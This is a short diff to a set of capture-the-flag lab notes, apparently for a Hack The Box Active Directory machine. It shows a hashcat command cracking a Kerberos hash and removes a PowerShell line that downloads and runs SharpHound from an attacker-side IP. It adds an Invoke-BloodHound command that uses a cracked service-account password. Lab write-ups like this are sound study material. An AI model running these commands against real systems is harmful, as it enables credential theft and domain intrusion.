@@ -180,6 +180,10 @@ hashcat -m 18200 svc.kerb /usr/share/wordlists/rockyou.txt --force
 # Privilage Escalation
 - run SharpHound to collect data for BloodHound upload it with
 ```
-iex(new-object net.webclient).downloadstring("http://10.10.16.4/SharpHound.ps1")
+upload SharpHound.ps1
 ```
-- 
+- run it with
+```
+invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+```
+
